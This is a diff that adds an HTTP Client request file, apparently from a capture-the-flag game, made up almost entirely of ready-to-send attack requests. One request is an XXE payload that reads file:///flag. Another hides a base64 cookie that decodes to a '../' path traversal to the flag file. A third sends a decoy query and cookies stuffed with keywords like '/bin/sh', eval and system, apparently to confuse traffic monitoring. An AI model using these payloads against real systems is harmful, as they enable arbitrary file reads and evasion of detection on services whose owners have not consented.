@@ -1,0 +1,26 @@
+# For a quick start check out our HTTP Requests collection (Tools|HTTP Client|Open HTTP Requests Collection).
+#
+# Following HTTP Request Live Templates are available:
+# * 'gtrp' and 'gtr' create a GET request with or without query parameters;
+# * 'ptr' and 'ptrp' create a POST request with a simple or parameter-like body;
+# * 'mptr' and 'fptr' create a POST request to submit a form with a text or file field (multipart/form-data);
+
+GET http://172.16.22.11:1337/index?m=bertram&f=flag&?56783=f9ee886intob44484c12&7c191=511e6fb447%2Fbin%2Fshc6cd8425&5aa3e1c3e5=f9489f52af86&2c4=12f041f%2Fflag555b&dd6de670=7f91335cc0andc7fc&e334c581=ab796selectab5&60f9aa45f=8c8e5band2c4397c9&ffe=c3b6ec72e4e83&553f10e=baa6a5d37db289&e255e=2bcafselectec76b0204&e5d61cf18c=cd1b876eval2fb655&9f69fc3=d7e8a16edd%2Fbin%2Fsh9fa&1d1=3eef2evaldbed&ac3aec57e=7a63d%2Fflagcb23281d1&a38613=1061aa8320%2Fflage527df2a48&7794bb9a6=9694588d63systemfccadae8&6db230a0=4f9636b4eassert935b6a&8acfea=702eval0a869e&239b43daa9=7652930842assertd3af5&891296=95b5e9uploadaa2
+Cookie: 8120f571e=c2d7c80626intoa31f76947;91f8=73071binc1a4;f273afa6c3=83ea67upload3bca;49b=1e7530b0eval2c68519;f57481=1a53and9bdb;bf442dbf6=ac9ffupload94826c6d;808ca3=73edc0evalcd2306e
+
+###
+
+POST http://172.16.22.18:1337/seckill
+Content-Type: application/xml
+
+<!DOCTYPE xxe [
+    <!ENTITY xxe SYSTEM "file:///flag">
+    ]>
+    <b><id>&xxe;</id></b>
+
+###
+
+GET http://172.16.22.11:1337/captcha
+Cookie: uuid=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZmxhZw==
+
+###
